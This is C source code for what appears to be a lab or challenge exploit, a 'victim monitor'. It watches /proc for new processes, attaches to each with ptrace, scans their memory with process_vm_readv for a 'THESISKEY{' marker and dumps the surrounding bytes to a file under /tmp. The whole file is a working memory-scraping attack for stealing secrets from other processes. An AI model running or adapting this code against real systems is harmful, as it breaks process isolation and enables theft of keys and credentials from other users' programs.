volatile int victim_found = 0;

void search_and_extract(pid_t pid) {
    printf("[*] Attempting to attach to PID %d\n", pid);

    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) != 0) {
        perror("ptrace attach failed");
        return;
    }

    int status;
    waitpid(pid, &status, 0);
    printf("[+] Attached to PID %d\n", pid);

    // Search memory for THESISKEY
    char buffer[65536];
    char found_any = 0;

    for (unsigned long addr = 0x400000; addr < 0x100000000UL; addr += 4096) {
        struct iovec local, remote;
        local.iov_base = buffer;
        local.iov_len = sizeof(buffer);
        remote.iov_base = (void*)addr;
        remote.iov_len = sizeof(buffer);

        ssize_t nread = process_vm_readv(pid, &local, 1, &remote, 1, 0);
        if (nread > 0) {
            char *found = memmem(buffer, nread, "THESISKEY{", 10);
            if (found) {
                found_any = 1;
                printf("[+] Found THESISKEY at 0x%lx!\n", addr + (found - buffer));

                // Write to file
                FILE *out = fopen("/tmp/thesis-ipc/extracted_secret.txt", "wb");
                if (out) {
                    // Read a larger chunk around the found address
                    struct iovec local2, remote2;
                    char buffer2[4096];
                    local2.iov_base = buffer2;
                    local2.iov_len = sizeof(buffer2);
                    remote2.iov_base = (void*)(addr + (found - buffer) - 100);
                    remote2.iov_len = sizeof(buffer2);

                    ssize_t nread2 = process_vm_readv(pid, &local2, 1, &remote2, 1, 0);
                    if (nread2 > 0) {
                        fwrite(buffer2, 1, nread2, out);
                        printf("[+] Wrote secret to /tmp/thesis-ipc/extracted_secret.txt\n");
                    }
                    fclose(out);
                }
                break;
            }
        }
    }

    ptrace(PTRACE_DETACH, pid, NULL, NULL);

    if (found_any) {
        victim_found = 1;
    }
}

pid_t find_new_process() {
    static pid_t last_max_pid = 0;
    DIR *procdir = opendir("/proc");
    struct dirent *ent;
    pid_t max_pid = 0;

    while ((ent = readdir(procdir)) != NULL) {
        if (ent->d_name[0] < '0' || ent->d_name[0] > '9') continue;

        pid_t pid = atoi(ent->d_name);
        if (pid > max_pid) max_pid = pid;

        // Return the first PID we haven't seen before
        if (pid > last_max_pid) {
            closedir(procdir);
            last_max_pid = pid;
            return pid;
        }
    }
    closedir(procdir);
    last_max_pid = max_pid;
    return 0;
}

int main() {
    printf("Starting fast victim monitor...\n");
    fflush(stdout);

    time_t start = time(NULL);
    int timeout = 120;  // 2 minute timeout

    while (time(NULL) - start < timeout && !victim_found) {
        pid_t new_pid = find_new_process();
        if (new_pid > 0) {
            // Verify this is a new process we haven't seen
            char cmdline_path[256];
            snprintf(cmdline_path, sizeof(cmdline_path), "/proc/%d/cmdline", new_pid);
            FILE *f = fopen(cmdline_path, "r");
            if (f) {
                char cmdline[512] = {0};
                fread(cmdline, 1, sizeof(cmdline)-1, f);
                fclose(f);

                // Skip system processes
                if (strlen(cmdline) > 0 && !strstr(cmdline, "bash") && !strstr(cmdline, "sh")) {
                    printf("[!] New process PID %d: %.100s\n", new_pid, cmdline);
                    search_and_extract(new_pid);
                }
            }
        }

        usleep(100000);  // Poll every 100ms
    }

    if (victim_found) {
        printf("[SUCCESS] Found and extracted victim secret!\n");
        return 0;
    } else {
        printf("[TIMEOUT] Did not find victim process within %d seconds\n", timeout);
        return 1;
    }
}
